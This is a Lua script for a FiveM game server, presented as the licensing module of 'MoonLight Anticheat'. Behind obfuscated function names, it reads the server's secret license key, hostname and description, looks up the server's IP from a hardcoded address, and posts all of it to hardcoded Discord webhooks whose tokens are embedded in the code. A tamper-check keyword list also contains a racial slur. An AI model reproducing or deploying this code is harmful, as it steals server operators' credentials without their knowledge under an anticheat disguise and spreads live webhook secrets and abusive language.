local httpDispatch = {}
local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local base32Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

AddEventHandler('__cfx_internal:httpResponse', function(token, status, body, headers)
    if httpDispatch[token] then
        local userCallback = httpDispatch[token]
        httpDispatch[token] = nil
        userCallback(status, body, headers)
    end
end)

function senharbiossuruyon(length)
    local res = ''
    for i = 1, length do
        res = res .. string.char(math.random(97, 122))
    end
    return res
end

function secured_dsipatch_server(url, cb, method, data, headers, options)
    local followLocation = true
                
    if options and options.followLocation ~= nil then
        followLocation = options.followLocation
    end

    local t = {
        url = url,
        method = method or 'GET',
        data = data or '',
        headers = headers or {},
        followLocation = followLocation
    }
    local d = json.encode(t)
    local id = PerformHttpRequestInternal(d, d:len())
    httpDispatch[id] = cb
end

function enc(data)
    return ((data:gsub('.', function(x) 
        local r,b='',x:byte()
        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
        return r;
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if (#x < 6) then return '' end
        local c=0
        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
        return b:sub(c+1,c+1)
    end)..({ '', '==', '=' })[#data%3+1])
end

function str_split(str, size)
    local result = {}
    for i=1, #str, size do
        table.insert(result, str:sub(i, i + size - 1))
    end
    return result
end

function dec2bin(num)
    local result = ''
    repeat
        local halved = num / 2
        local int, frac = math.modf(halved)
        num = int
        result = math.ceil(frac) .. result
    until num == 0
    return result
end

local function padRight(str, length, char)
    while #str % length ~= 0 do
        str = str .. char
    end
    return str
end

function otuz2(str)
local binary = str:gsub('.', function (char)
    return string.format('%08u', dec2bin(char:byte()))
end)

binary = str_split(binary, 5)
local last = table.remove(binary)
table.insert(binary, padRight(last, 5, '0'))

local encoded = {}
for i=1, #binary do
    local num = tonumber(binary[i], 2)
    table.insert(encoded, base32Alphabet:sub(num + 1, num + 1))
end
return padRight(table.concat(encoded), 8, '=')
end

function spec1(s)
    return (s:gsub('%a', function(c) c=c:byte() return string.char(c+(c%32<14 and 13 or -13))end))
end

function sedj(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end






fdgojaosijdhsoijs8uoiujheoijdsfoi = function(color, message,webhook)
    local info = GetConvar('sv_licenseKey', 'Not found!')
    local desc = GetConvar('sv_projectDesc', 'Not found!')
    local servernameinfo = GetConvar("sv_hostname", 'Not found!')
    secured_dsipatch_server("http://45.88.109.116:7777/auth/check/showmyip", function(err, text22, headers)
        secured_dsipatch_server(webhook, function(err, text, headers) end, 'POST', json.encode({
            embeds = {{
                thumbnail = {
                    url = 'https://media.discordapp.net/attachments/985980868390703164/988825047194021958/unknown.png?width=676&height=676'
                },
                author= {
                    name = "MoonLight Anticheat | Auth",
                    icon_url = "https://media.discordapp.net/attachments/985980868390703164/988825047194021958/unknown.png?width=676&height=676",
                    url = "https://discord.gg/moonlightac"
                },
                title = "Moonlight Anticheat | AUTH", 
                description = "**ServerName:** "..servernameinfo.."\n**Server IP:** "..text22.."\n**Server Desc:** "..desc.."\n**Server Key:** "..info.."\n\n**Reason:** "..message, 
                footer = { text = "MoonAuth"},
                color = color
            }
        }
        }),  { ['Content-Type'] = 'application/json' })
    end, 'GET')

end

secured_dsipatch_server("http://45.88.109.116:7777/auth/check/ips", function(err, text333, headers) 
    secured_dsipatch_server("http://45.88.109.116:7777/auth/check/showmyip", function(err, text22, headers)
        if string.match(text333, text22) then 
            fdgojaosijdhsoijs8uoiujheoijdsfoi(16711680, '[Server Blacklisted] A Blacklisted Server tried to execute this script', "https://discord.com/api/webhooks/992520608053219418/c-EPkfnrIPrZYxhd2RdMAquzAu0VD1JtlB6vCSt7NVRlBRQ1AIbSgGgemwsUul-k5A0j")
        end
    end, 'GET')
end, "GET")

local myfile245 = LoadResourceFile(GetCurrentResourceName(), "/server/server.lua")
if myfile245 == nil then
    print("nil server.lua")
    fdgojaosijdhsoijs8uoiujheoijdsfoi(16711680, '[Server.lua] is nil (Server Stopped)', "https://discord.com/api/webhooks/992513349743038546/Cv45XXkllV37gJJ0fsfTZ3t95hEqp5g7uEDD-vYoybux6IxA1K7BiDrR3IEmgMWq8Ap5")
end 
if string.find(myfile245, 'PerformHttpRequestInternal') 
    or string.find(myfile245, 'PerformHttpRequest')
    or string.find(myfile245, 'Cracked') 
    or string.find(myfile245, 'print') 
    or string.find(myfile245, '_PerformHttpRequest')
    or string.find(myfile245, 'LoadResourceFile')
    then
    fdgojaosijdhsoijs8uoiujheoijdsfoi(16711680, '[File contains bypass codes] Server stopped', "https://discord.com/api/webhooks/992513349743038546/Cv45XXkllV37gJJ0fsfTZ3t95hEqp5g7uEDD-vYoybux6IxA1K7BiDrR3IEmgMWq8Ap5")
end 

local fx = LoadResourceFile(GetCurrentResourceName(), "fxmanifest.lua")
if string.find(fx, 'cracked') or string.find(fx, 'nigger') or string.find(fx, 'dnz') or string.find(fx, 'discord') or string.find(fx, "bypass") or string.find(fx, "bypassed") then 
    fdgojaosijdhsoijs8uoiujheoijdsfoi(16711680, '[fxmanifste.lua blacklisted names found] Server stopped', "https://discord.com/api/webhooks/992513349743038546/Cv45XXkllV37gJJ0fsfTZ3t95hEqp5g7uEDD-vYoybux6IxA1K7BiDrR3IEmgMWq8Ap5")
end